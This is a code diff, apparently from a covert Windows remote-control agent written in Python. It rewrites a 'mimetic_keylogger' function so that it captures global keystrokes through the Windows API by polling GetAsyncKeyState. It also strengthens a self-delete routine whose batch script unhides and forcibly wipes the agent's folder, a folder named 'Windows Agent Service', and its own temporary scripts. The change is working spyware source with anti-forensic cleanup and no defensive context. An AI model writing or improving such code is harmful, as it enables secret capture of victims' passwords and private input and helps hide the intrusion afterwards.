@@ -260,57 +260,86 @@ def ensure_startup():
 
 
 def mimetic_keylogger():
-    """Capture keyboard input using pynput (more reliable than keyboard library)."""
-    try:
-        from pynput.keyboard import Listener
-    except ImportError:
-        try:
-            print("[mimetic] Installing pynput module...", flush=True)
-            subprocess.run(
-                [sys.executable, "-m", "pip", "install", "pynput", "-q"],
-                capture_output=True,
-                timeout=30,
-                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
-            )
-            from pynput.keyboard import Listener
-        except Exception as e:
-            return f"Error: Could not install pynput - {str(e)}"
+    """Capture keyboard input globally using Windows API."""
+    import ctypes
+    import threading
+
+    log = []
+    stop_event = threading.Event()
+
+    # Windows key codes
+    VK_ESCAPE = 0x1B
 
     try:
+        # Get Windows API functions
+        GetAsyncKeyState = ctypes.windll.user32.GetAsyncKeyState
 
-        log = []
+        def key_to_string(vk_code):
+            """Convert Windows virtual key code to string."""
+            # Special keys mapping
+            key_map = {
+                0x20: '[SPACE]',      # VK_SPACE
+                0x0D: '[ENTER]',      # VK_RETURN
+                0x09: '[TAB]',        # VK_TAB
+                0x08: '[BACKSPACE]',  # VK_BACK
+                0x2E: '[DELETE]',     # VK_DELETE
+                0x10: '[SHIFT]',      # VK_SHIFT
+                0x11: '[CTRL]',       # VK_CONTROL
+                0x12: '[ALT]',        # VK_MENU
+                0x1B: '[ESC]',        # VK_ESCAPE
+                0x70: '[F1]',         # VK_F1
+                0x71: '[F2]',         # VK_F2
+            }
 
-        def on_press(key):
+            if vk_code in key_map:
+                return key_map[vk_code]
+
+            # Try to convert to ASCII for printable keys
             try:
-                # Try to get character
-                if hasattr(key, 'char') and key.char:
-                    log.append(key.char)
-                else:
-                    # Map special keys
-                    key_str = str(key).replace("Key.", "").upper()
-                    if key_str == "SPACE":
-                        log.append('[SPACE]')
-                    elif key_str == "ENTER":
-                        log.append('[ENTER]')
-                    elif key_str == "TAB":
-                        log.append('[TAB]')
-                    elif key_str == "BACKSPACE":
-                        log.append('[BACKSPACE]')
-                    elif key_str == "DELETE":
-                        log.append('[DELETE]')
-                    elif key_str == "ESC":
-                        return False  # Stop listening
-                    else:
-                        log.append(f'[{key_str}]')
+                # Virtual keys 0x30-0x39 are 0-9
+                if 0x30 <= vk_code <= 0x39:
+                    return chr(vk_code)
+                # Virtual keys 0x41-0x5A are A-Z
+                if 0x41 <= vk_code <= 0x5A:
+                    return chr(vk_code).lower()
+                # Other punctuation - requires keyboard state
+                if 0xBA <= vk_code <= 0xC0 or 0xDB <= vk_code <= 0xDE:
+                    return f'[{vk_code:X}]'
+                return None
             except:
-                pass
+                return None
 
-        # Listen for keyboard input with 3-second timeout
-        with Listener(on_press=on_press) as listener_obj:
-            listener_obj.join(timeout=3)
+        # Poll for 3 seconds
+        start_time = time.time()
+        last_keys = set()
+
+        while time.time() - start_time < 3 and not stop_event.is_set():
+            # Check all keys
+            for vk_code in range(256):
+                key_state = GetAsyncKeyState(vk_code)
+                is_pressed = bool(key_state & 0x8000)
+
+                # Check if key state changed (pressed this frame)
+                if is_pressed and vk_code not in last_keys:
+                    last_keys.add(vk_code)
+
+                    # ESC stops immediately
+                    if vk_code == VK_ESCAPE:
+                        stop_event.set()
+                        break
+
+                    # Add other key
+                    key_str = key_to_string(vk_code)
+                    if key_str:
+                        log.append(key_str)
+                elif not is_pressed and vk_code in last_keys:
+                    last_keys.discard(vk_code)
+
+            time.sleep(0.05)  # Poll every 50ms
 
         result = ''.join(log)
         return result if result else "No keys recorded"
+
     except Exception as e:
         return f"Error: {str(e)}"
     finally:
@@ -365,7 +394,6 @@ def self_delete_agent(trigger_id):
     try:
         if os.path.exists(local_dir):
             shutil.rmtree(local_dir, ignore_errors=True)
-        # Also remove legacy "Windows Agent Service" folder if it exists
         legacy_folder = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Windows Agent Service")
         if os.path.exists(legacy_folder):
             shutil.rmtree(legacy_folder, ignore_errors=True)
@@ -376,6 +404,7 @@ def self_delete_agent(trigger_id):
         "@echo off",
         "setlocal EnableDelayedExpansion",
         "set \"parent_pid=%~1\"",
+        "set \"retry_count=0\"",
         "shift",
         ":loop",
         "if \"%~1\"==\"\" goto cleanup",
@@ -398,9 +427,17 @@ def self_delete_agent(trigger_id):
         f"attrib -h \"{local_dir}\" 2>nul",
         f"timeout /t 1 /nobreak >nul",
         f"rmdir /s /q \"{local_dir}\" 2>nul",
+        f"timeout /t 1 /nobreak >nul",
         f"if exist \"{local_dir}\" rmdir /s /q \"{local_dir}\" 2>nul",
+        f"timeout /t 1 /nobreak >nul",
+        f"if exist \"{local_dir}\" robocopy \"{local_dir}\" \"{local_dir}.tmp\" /mir /r:0 >nul 2>&1",
+        f"timeout /t 1 /nobreak >nul",
+        f"if exist \"{local_dir}.tmp\" rmdir /s /q \"{local_dir}.tmp\" 2>nul",
+        f"if exist \"{local_dir}\" for /r \"{local_dir}\" %%f in (*) do del /f /q \"%%f\" 2>nul",
+        f"if exist \"{local_dir}\" pushd \"{local_dir}\" && cd /d .. && popd && rmdir /s /q \"{local_dir}\" 2>nul",
         "del /f /q \"%temp%\\telelluc*.bat\" 2>nul",
         "del /f /q \"%temp%\\telelluc*.vbs\" 2>nul",
+        "timeout /t 2 /nobreak >nul",
         "exit /b 0",
     ]
 
